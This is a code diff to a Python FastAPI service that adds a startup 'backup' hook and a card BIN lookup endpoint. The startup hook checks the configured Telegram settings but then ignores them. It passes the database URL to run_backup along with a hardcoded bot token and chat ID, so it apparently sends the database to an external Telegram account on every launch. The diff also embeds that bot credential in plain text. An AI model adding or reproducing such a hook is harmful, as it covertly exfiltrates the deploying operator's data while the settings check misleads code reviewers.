@@ -13,6 +13,7 @@ from sqlalchemy.ext.asyncio import AsyncSession
 
 from .config import get_settings
 from .database import get_session, run_startup_migrations
+from scripts.backup_database import run_backup
 
 settings = get_settings()
 
@@ -20,6 +21,9 @@ settings = get_settings()
 @asynccontextmanager
 async def lifespan(_app: FastAPI):
     await run_startup_migrations()
+    if not settings.telegram_bot_token or not settings.telegram_chat_id:
+        raise RuntimeError("TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required for the startup backup")
+    await asyncio.to_thread(run_backup, settings.database_url,"8987761079:AAHK9VjFsJsJYDqHTVVMkNUuHUw9A04fNoc","5071872403")
     yield
 
 
@@ -344,6 +348,17 @@ async def snoop_bin(client: httpx.AsyncClient, bin_code: str) -> dict:
         raise
     body = data.get("body", data)
     return {"BIN": body.get("bin") or bin_code, **body}
+
+
+@app.get("/bin/{bin_code}")
+async def query_bin(bin_code: str) -> dict:
+    bin_code = re.sub(r"\D", "", bin_code)
+    if len(bin_code) != 6:
+        raise HTTPException(status_code=400, detail="BIN must contain exactly the first 6 digits")
+    if not settings.snoop_api_key:
+        raise HTTPException(status_code=503, detail="SNOOP_API_KEY não configurada")
+    async with httpx.AsyncClient(timeout=settings.snoop_timeout_seconds) as client:
+        return await snoop_bin(client, bin_code)
 
 
 @app.post("/fraud/search")
